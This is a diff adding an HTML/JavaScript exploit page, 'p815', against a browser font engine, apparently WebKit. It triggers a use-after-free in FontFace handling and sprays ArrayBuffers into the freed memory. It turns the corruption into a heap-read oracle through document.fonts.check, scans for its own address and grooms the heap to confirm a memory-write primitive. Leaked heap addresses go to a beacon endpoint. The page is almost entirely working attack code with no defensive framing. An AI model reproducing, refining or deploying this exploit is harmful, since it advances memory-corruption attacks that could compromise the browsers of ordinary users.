@@ -1,0 +1,563 @@
+<!--
+  p815: Wide RS scan for SELF discovery + feng shui + butterfly write
+
+  Key fix over p814: Removes dead UR chain (.unicodeRange is JS-cached,
+  never reads C++ backing). Improves RS scan: multiple centers (L1, L2,
+  midpoint, shifted±256KB), reduced dedup threshold (256KB), three
+  progressive margins (512KB/768KB/1MB), smaller chunks (2000) with
+  30-50ms GC yields between chunks to prevent tab OOM.
+
+  Flow: UAF → spray → oracle → SELFIDX → RS wide scan → FS → BV → WR
+  Params: ?k=32 &pw=80 &bfc=24
+  CRASH_CLASS: LOW (heap reads via oracle, no writes to foreign objects)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p815 Wide RS</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out" style="font:11px monospace;white-space:pre-wrap">p815 — wide RS SELF + feng shui butterfly placement</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{navigator.sendBeacon('/beacon/P815v1-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P815v1-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',32), PW=qint('pw',80), BFC=qint('bfc',24);
+var SIZE=192, fired=false, faces=null;
+
+/* --- helpers --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){if(typeof x==='bigint')return '0x'+x.toString(16);return '0x'+x.toString(16);}
+
+/* --- pre-UAF heap padding: warm bmalloc 192B pages to reduce unmapped gaps --- */
+var PAD_COUNT=64;
+var __pad=[];
+for(var pi=0;pi<PAD_COUNT;pi++){
+  var pb=new Uint8Array(new ArrayBuffer(SIZE));
+  pb[0]=0xDD;pb[1]=0xDD;
+  __pad.push(pb);
+}
+b('PAD-'+PAD_COUNT+'x'+SIZE);
+
+/* --- crash-loop guard --- */
+var CK='p815v1_tries';
+var MAX_TRIES=15,tries=0;
+try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
+var GUARD_HALT=false;
+if(tries>=MAX_TRIES){GUARD_HALT=true;b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
+  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace('/?_='+Date.now());},8000);}
+else{
+  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
+  b('VER-P815v1');b('BOOT-'+UID+',try='+(tries+1)+',bfc='+BFC);
+}
+
+/* ============================================================
+   PHASE 1: UAF trigger + spray
+   ============================================================ */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* ============================================================
+   PHASE 2: Oracle setup + RS scan + feng shui
+   ============================================================ */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;
+  var allLeaks=[];
+  var leakSet={};
+
+  for(var i=0;i<window.__sp.length;i++){
+    var hasLeak=false;
+    for(var off=0;off<SIZE;off+=8){
+      var v=le(window.__sp[i],off);
+      if(v>0x1000000000n&&v<0x20000000000n){
+        var vs=v.toString(16);
+        if(!leakSet[vs]){leakSet[vs]=true;allLeaks.push(v);}
+        if(!hasLeak&&off>=0x50){
+          hasLeak=true;
+          var c68=le(window.__sp[i],0x68);
+          if(c68>0x1000000000n&&c68<0x20000000000n){
+            bufs.push([window.__sp[i],c68]);bufl1.push(v);
+            if(!rawL)rawL=[v,c68];
+          }
+        }
+      }
+    }
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  allLeaks.sort(function(a2,b2){return a2<b2?-1:a2>b2?1:0;});
+  b('LEAKS-'+allLeaks.length+',L1='+hex(L1)+',L2='+hex(L2));
+  if(allLeaks.length>0){
+    bs('LEAK-MIN='+hex(allLeaks[0])+',MAX='+hex(allLeaks[allLeaks.length-1]));
+    var leakSample='';for(var ls=0;ls<Math.min(allLeaks.length,8);ls++)leakSample+=(ls?',':'')+hex(allLeaks[ls]);
+    bs('LEAK-SAMPLE:'+leakSample);
+  }
+  if(!bufs.length||L2===0n){
+    if(allLeaks.length>=2){L1=allLeaks[0];L2=allLeaks[allLeaks.length-1];bufs.push([window.__sp[0],L2]);bufl1.push(L1);rawL=[L1,L2];}
+    else{b('NOLEAK');verd('bad','NOLEAK');setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}
+  }
+
+  /* forge for oracle mode */
+  var forgeL2=(bufs.length>0)?bufs[0][1]:L2;
+  for(var ib=0;ib<window.__sp.length;ib++){
+    var vb=window.__sp[ib];
+    vb[0]=0; vb[3]=0; put64(vb,0x08,forgeL2); vb[0x10]=0; vb[0x82]=0;
+  }
+  b('FORGED-'+bufs.length+'/'+window.__sp.length);
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+        for(var is2=0;is2<window.__sp.length;is2++){window.__sp[is2][0x28]=1;window.__sp[is2][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+        var SKIPJ=-1;
+        function setR(t){for(var ir=0;ir<window.__sp.length;ir++){if(SKIPJ>=0&&ir===SKIPJ)continue;if(!window.__sp[ir])continue;put64(window.__sp[ir],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- oracle validation --- */
+        var t1=-1,l2i=-1,oracleOff=0n;
+        var OO_A=[];for(var oa=0;oa<=0x38;oa+=4)OO_A.push(BigInt(oa));
+        var OO_U=[0x05n,0x07n,0x0Bn,0x0Fn,0x13n,0x17n,0x1Bn,0x1Fn,0x23n,0x27n];
+        var OO_ALL=OO_A.concat(OO_U);
+        for(var q8=0;q8<bufs.length&&t1<0;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          for(var oi=0;oi<OO_ALL.length;oi++){
+            setR(L2+OO_ALL[oi]);
+            if(chk(0)===true){t1=boundary(L2+OO_ALL[oi]);if(t1>=0){oracleOff=OO_ALL[oi];l2i=q8;break;}}
+          }
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+        var oracleAlive=(t1>=0);
+        for(var ipd=0;ipd<window.__sp.length;ipd++){var vpd=window.__sp[ipd];
+          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        if(!oracleAlive){b('A-DEAD');verd('bad','ORACLE DEAD — retry');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);return;}
+        b('ORACLE-ALIVE-off='+hex(oracleOff));
+
+        /* --- Phase SELFIDX --- */
+        var selfIdx=-1;
+        if(oracleAlive && t1>=0){
+          setR(L2+oracleOff);
+          var bline=chk(t1);
+          bs('SD-bl='+bline+',t1='+t1+',off='+hex(oracleOff));
+
+          for(var gk=0;gk<window.__sp.length;gk++)put32(window.__sp[gk],0x28,0);
+          var gkR=chk(t1);
+          for(var gk2=0;gk2<window.__sp.length;gk2++)put32(window.__sp[gk2],0x28,1);
+          bs('SD-gk='+gkR);
+
+          if(bline===true){
+            if(gkR!==bline){
+              for(var sij=0;sij<window.__sp.length&&selfIdx<0;sij++){
+                put32(window.__sp[sij],0x28,0);
+                var tst=chk(t1);
+                put32(window.__sp[sij],0x28,1);
+                if(tst!==bline)selfIdx=sij;
+              }
+              bs('SD-szM='+selfIdx);
+            }
+            if(selfIdx<0){
+              var altOff=(oracleOff===0n)?4n:0n;
+              setR(L2+altOff);
+              var altBl=chk(t1);
+              setR(L2+oracleOff);
+              bs('SD-alt='+altBl);
+              if(altBl!==bline){
+                for(var sij2=0;sij2<window.__sp.length&&selfIdx<0;sij2++){
+                  put64(window.__sp[sij2],0x20,L2+altOff);
+                  var tst2=chk(t1);
+                  put64(window.__sp[sij2],0x20,L2+oracleOff);
+                  if(tst2!==bline)selfIdx=sij2;
+                }
+                bs('SD-ptrM='+selfIdx);
+              }
+            }
+          }
+          b('SELFIDX-'+selfIdx);
+        }
+
+        /* ============================================================
+           PHASE RS: Wide multi-center scan — 512KB / 768KB / 1MB
+           Multiple centers from leaks + shifted copies to cover more heap.
+           Smaller chunks (2000) with 30-50ms yields to prevent OOM.
+           ============================================================ */
+        var n3=0;
+        if(!selfFound && selfIdx>=0){
+          bs('RS-START');
+          window.__sp[selfIdx][0x38]=0xEF;window.__sp[selfIdx][0x39]=0xBE;
+          window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
+          window.__sp[selfIdx][0x3C]=0xAD;window.__sp[selfIdx][0x3D]=0xDE;
+          window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
+
+          var RS_MARGINS=[0x80000n, 0xC0000n, 0x100000n];
+          var RS_BUDGET_PER=20000;
+          var RS_MAX_PROBES=22000;
+          var RS_STEP=0xC0n;
+          var RS_ALIGNS=[0n,64n,128n];
+          var rsMIdx=0;
+
+          function rsProbe(addr){
+            put64(window.__sp[selfIdx],0x20,addr+0x38n);
+            n3++;
+            if(chk(0xBEEF)===true){
+              if(chk(0xBEEE)===false&&chk(0xDEAD)===true&&chk(0xDEAE)===false){
+                self=addr;selfFound=true;
+                b('SELF-RS-'+hex(self)+',d='+n3+',m='+rsMIdx);
+                return true;
+              }
+            }
+            return false;
+          }
+
+          function rsRun(){
+            if(selfFound||rsMIdx>=RS_MARGINS.length){rsComplete();return;}
+            n3=0;
+            var margin=RS_MARGINS[rsMIdx];
+            var leakLo=allLeaks[0],leakHi=allLeaks[allLeaks.length-1];
+            var rsFloor=(leakLo>margin)?leakLo-margin:0x1000000000n;
+            if(rsFloor<0x1000000000n)rsFloor=0x1000000000n;
+            var rsCeiling=leakHi+margin;
+            if(rsCeiling>0x20000000000n)rsCeiling=0x20000000000n;
+            bs('RS-m'+rsMIdx+'='+hex(margin)+',bounds='+hex(rsFloor)+'-'+hex(rsCeiling));
+
+            var rawCenters=[];
+            for(var al=0;al<allLeaks.length;al++)rawCenters.push(allLeaks[al]&(~0x3Fn));
+            if(rawCenters.length>=2)rawCenters.push(((rawCenters[0]+rawCenters[rawCenters.length-1])/2n)&(~0x3Fn));
+            /* shifted centers: ±256KB from extremes to expand coverage */
+            var shLo=(allLeaks[0]-0x40000n)&(~0x3Fn);
+            var shHi=(allLeaks[allLeaks.length-1]+0x40000n)&(~0x3Fn);
+            if(shLo>0x1000000000n)rawCenters.push(shLo);
+            if(shHi<0x20000000000n)rawCenters.push(shHi);
+            var centers=[];
+            for(var dc=0;dc<rawCenters.length;dc++){
+              var dup=false;
+              for(var dc2=0;dc2<centers.length;dc2++){
+                var gap=rawCenters[dc]>centers[dc2]?rawCenters[dc]-centers[dc2]:centers[dc2]-rawCenters[dc];
+                if(gap<0x40000n){dup=true;break;}
+              }
+              if(!dup)centers.push(rawCenters[dc]);
+            }
+            var perCenter=Math.floor(RS_BUDGET_PER/Math.max(centers.length*RS_ALIGNS.length,1));
+            bs('RS-c='+centers.length+',pc='+perCenter+',total~'+(centers.length*perCenter*RS_ALIGNS.length*2));
+
+            var rsAlign=0;
+            function rsNext(rci,rstep){
+              if(selfFound||rci>=centers.length){
+                if(!selfFound){
+                  bs('RS-MISS-m'+rsMIdx+'-'+n3);
+                  rsMIdx++;
+                  setTimeout(rsRun,50);
+                } else {
+                  rsComplete();
+                }
+                return;
+              }
+              if(rstep===0)bs('RS-ph'+rci+'='+hex(centers[rci])+',al='+rsAlign+',m='+rsMIdx);
+              var rend=Math.min(rstep+2000,perCenter);
+              while(rstep<rend&&!selfFound&&n3<RS_MAX_PROBES){
+                var roff=BigInt(rstep)*RS_STEP+RS_ALIGNS[rsAlign];
+                var down=centers[rci]-roff;
+                if(down>=rsFloor)rsProbe(down);
+                if(!selfFound&&n3<RS_MAX_PROBES){
+                  var up=centers[rci]+roff;
+                  if(up<rsCeiling)rsProbe(up);
+                }
+                if(n3%65536===0)bs('RS-p-'+n3);
+                rstep++;
+              }
+              if(selfFound){rsComplete();return;}
+              if(n3>=RS_MAX_PROBES){
+                bs('RS-CAP-'+n3);rsMIdx++;setTimeout(rsRun,50);return;
+              }
+              if(rstep>=perCenter){
+                rsAlign++;
+                if(rsAlign>=RS_ALIGNS.length){rsAlign=0;setTimeout(function(){rsNext(rci+1,0);},50);}
+                else setTimeout(function(){rsNext(rci,0);},30);
+              }
+              else setTimeout(function(){rsNext(rci,rstep);},30);
+            }
+            rsNext(0,0);
+          }
+
+          function rsComplete(){
+            window.__sp[selfIdx][0x38]=0x00;window.__sp[selfIdx][0x39]=0x10;
+            window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
+            window.__sp[selfIdx][0x3C]=0x00;window.__sp[selfIdx][0x3D]=0x20;
+            window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
+            afterRS();
+          }
+          rsRun();
+          return;
+        }
+        afterRS();
+
+        function afterRS(){
+        if(!selfFound){
+          b('NOSELF-'+n3);verd('bad','NOSELF '+n3);
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);
+          return;
+        }
+        b('SELF-'+hex(self)+',n3='+n3);
+
+        if(bufs&&bufs.length>1){
+          var sjt=boundary(self);
+          if(sjt>=0x1000&&sjt<0x1000+K){SKIPJ=sjt-0x1000;}
+        }
+        b('SKIPJ-'+SKIPJ);
+        for(var ir2=0;ir2<window.__sp.length;ir2++){if(SKIPJ>=0&&ir2===SKIPJ)continue;if(!window.__sp[ir2])continue;put64(window.__sp[ir2],0x20,self+0x38n);}
+
+        /* ============================================================
+           PHASE FS: Heap Feng Shui — discover spray layout, free, place BFs
+           ============================================================ */
+        bs('FS-START');
+
+        /* Step 1: Discover spray buffer addresses by scanning around SELF */
+        var SCAN_RADIUS=256;
+        var sprayMap={};
+        var sprayAddrs=[];
+        var scanCalls=0;
+        for(var sn=-SCAN_RADIUS;sn<=SCAN_RADIUS;sn++){
+          var cAddr=self+BigInt(sn)*BigInt(SIZE);
+          if(cAddr<0x1000000000n)continue;
+          var mk=boundary(cAddr);
+          scanCalls++;
+          if(mk>=0x1000&&mk<0x1000+K){
+            var spIdx=mk-0x1000;
+            if(!sprayMap[spIdx]){
+              sprayMap[spIdx]=cAddr;
+              sprayAddrs.push({idx:spIdx,addr:cAddr,slot:sn});
+            }
+          }
+        }
+        bs('FS-SCAN:found='+sprayAddrs.length+'/'+K+',calls='+scanCalls);
+        for(var sd=0;sd<Math.min(sprayAddrs.length,5);sd++){
+          bs('FS-SP:'+sprayAddrs[sd].idx+'@slot'+sprayAddrs[sd].slot+'='+hex(sprayAddrs[sd].addr));
+        }
+
+        if(sprayAddrs.length<3){
+          b('FS-TOOFEW-'+sprayAddrs.length);verd('bad','Only '+sprayAddrs.length+' spray bufs found near SELF — retrying');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);
+          return;
+        }
+
+        /* Step 2: Build free list */
+        var keep={};keep[selfIdx]=true;if(SKIPJ>=0)keep[SKIPJ]=true;
+        var freeList=[];
+        for(var fl=0;fl<sprayAddrs.length;fl++){
+          if(!keep[sprayAddrs[fl].idx])freeList.push(sprayAddrs[fl]);
+        }
+        bs('FS-free='+freeList.length+',keep=selfIdx='+selfIdx+(SKIPJ>=0?'+SKIPJ='+SKIPJ:''));
+
+        /* Step 3: Free spray buffers */
+        for(var ff=0;ff<freeList.length;ff++){
+          window.__sp[freeList[ff].idx]=null;
+        }
+        if(bufs){for(var fb=0;fb<bufs.length;fb++){if(bufs[fb])bufs[fb][0]=null;}}
+        bufs=null;bufl1=null;rawL=null;
+        bs('FS-NULLED-'+freeList.length);
+
+        /* Step 4: Force FULL GC */
+        for(var gc1=0;gc1<2000;gc1++){new ArrayBuffer(4096);}
+        bs('FS-GC1-EDEN');
+
+        setTimeout(function(){
+        for(var gc2=0;gc2<2000;gc2++){new ArrayBuffer(4096);}
+        bs('FS-GC2-WAIT5S');
+
+        setTimeout(function(){
+        for(var gc3=0;gc3<3000;gc3++){new ArrayBuffer(4096);}
+        bs('FS-GC3-FULLGC-TRIGGER');
+        var gcStill=0;
+        for(var gci=0;gci<Math.min(freeList.length,3);gci++){
+          var gmk=boundary(freeList[gci].addr);
+          if(gmk>=0x1000&&gmk<0x1000+K) gcStill++;
+        }
+        bs('GC-CHECK:still='+gcStill+'/'+Math.min(freeList.length,3));
+
+        setTimeout(function(){
+        /* Step 5: Allocate replacement ArrayBuffers */
+        var replacements=[];
+        var BF_MARKER_BASE=0xD000;
+        for(var ra=0;ra<BFC;ra++){
+          var rb=new Uint8Array(new ArrayBuffer(SIZE));
+          put32(rb,0,0);
+          put32(rb,4,BF_MARKER_BASE+ra);
+          put32(rb,8,0);
+          put32(rb,12,0xE000+ra);
+          replacements.push(rb);
+        }
+        bs('FS-REPL-ALLOC-'+BFC);
+
+        /* ============================================================
+           PHASE BV: Scan freed addresses for replacement markers
+           ============================================================ */
+        bs('BV-START,slots='+freeList.length);
+        var bfHits=[];
+        var bvCalls=0;
+
+        for(var bvi=0;bvi<freeList.length;bvi++){
+          var sAddr=freeList[bvi].addr;
+          var bnd=boundary(sAddr);
+          bvCalls++;
+          if(bnd>=BF_MARKER_BASE&&bnd<BF_MARKER_BASE+BFC){
+            var bfIdx=bnd-BF_MARKER_BASE;
+            bfHits.push({slot:freeList[bvi].idx,bfIdx:bfIdx,addr:sAddr});
+            bs('BV-HIT:slot='+freeList[bvi].idx+',bfIdx='+bfIdx+',addr='+hex(sAddr));
+          }
+          if(bvCalls%64===0)bs('BV-p-'+bvCalls);
+        }
+        bs('BV-DONE,hits='+bfHits.length+',calls='+bvCalls);
+
+        /* ============================================================
+           PHASE BV2: Verify hits with second marker at offset +8
+           ============================================================ */
+        var verified=[];
+        for(var bv2=0;bv2<bfHits.length;bv2++){
+          var hit=bfHits[bv2];
+          var v1=boundary(hit.addr+8n);
+          var expected=0xE000+hit.bfIdx;
+          var pass=(v1===expected);
+          if(pass)verified.push(hit);
+          bs('BV2:slot='+hit.slot+',idx='+hit.bfIdx+','+(pass?'OK':'FAIL:got='+v1));
+        }
+        bs('BV2-DONE,ver='+verified.length+'/'+bfHits.length);
+
+        /* ============================================================
+           PHASE WR: Write test via Uint8Array at known address
+           ============================================================ */
+        var writeConfirmed=false;
+        var writeTestIdx=-1;
+        if(verified.length>0){
+          var wt=verified[0];
+          writeTestIdx=wt.bfIdx;
+          put32(replacements[wt.bfIdx],0,0);
+          put32(replacements[wt.bfIdx],4,0xAAAA);
+          var wrBnd=boundary(wt.addr);
+          if(wrBnd===0xAAAA){
+            writeConfirmed=true;
+            bs('WR-OK:slot='+wt.slot+',bfIdx='+wt.bfIdx+',addr='+hex(wt.addr));
+            put32(replacements[wt.bfIdx],4,BF_MARKER_BASE+wt.bfIdx);
+          } else {
+            bs('WR-FAIL:expected=0xAAAA,got='+wrBnd);
+          }
+        }
+
+        /* ============================================================
+           PHASE RD: Read test
+           ============================================================ */
+        var rd1=boundary(self+0x38n);
+        bs('RD-SELF38:'+rd1);
+
+        if(bfHits.length>0){
+          var hdrBnd=boundary(bfHits[0].addr);
+          bs('RD-BFHDR:'+hdrBnd);
+        }
+
+        /* ============================================================
+           PHASE ADJ: Adjacency analysis
+           ============================================================ */
+        var adjCount=0;
+        if(verified.length>=2){
+          verified.sort(function(a2,b2){return a2.slot-b2.slot;});
+          for(var adi=0;adi<verified.length-1;adi++){
+            if(verified[adi+1].slot-verified[adi].slot===1){
+              adjCount++;
+              bs('ADJ:'+verified[adi].bfIdx+'@'+verified[adi].slot+'+'+verified[adi+1].bfIdx+'@'+verified[adi+1].slot);
+            }
+          }
+        }
+        bs('ADJ-TOTAL:'+adjCount);
+
+        /* ============================================================
+           FINAL: Summary
+           ============================================================ */
+        try{localStorage.removeItem(CK);}catch(e){}
+
+        var summary='SELF='+hex(self)+',BF='+bfHits.length+',ver='+verified.length+',adj='+adjCount+',WR='+(writeConfirmed?'YES':'NO');
+        bs('RESULT:'+summary);
+        b('RESULT:'+summary);
+
+        var html='SELF: '+hex(self)+'<br>Feng shui BF hits: '+bfHits.length+', verified: '+verified.length+
+          '<br>Adjacent pairs: '+adjCount+
+          '<br>Write primitive: '+(writeConfirmed?'<b style="color:green">CONFIRMED</b>':'NOT YET');
+        verd((verified.length>0)?'ok':'bad',html);
+
+        if(!writeConfirmed){
+          bs('RETRY-BV0');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);
+        }
+
+        if(verified.length>0){
+          var dump='VERIFIED-ADDRS:';
+          for(var dv=0;dv<verified.length;dv++){
+            dump+=' bf'+verified[dv].bfIdx+'@'+hex(verified[dv].addr);
+          }
+          bs(dump);
+          b(dump);
+        }
+
+      },500);
+      },5000);
+      },500);
+        } /* end afterRS */
+      },60);
+    },40);
+  },60);
+}
+
+if(!GUARD_HALT){
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,2000);
+else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
+}
+</script>
+</body></html>
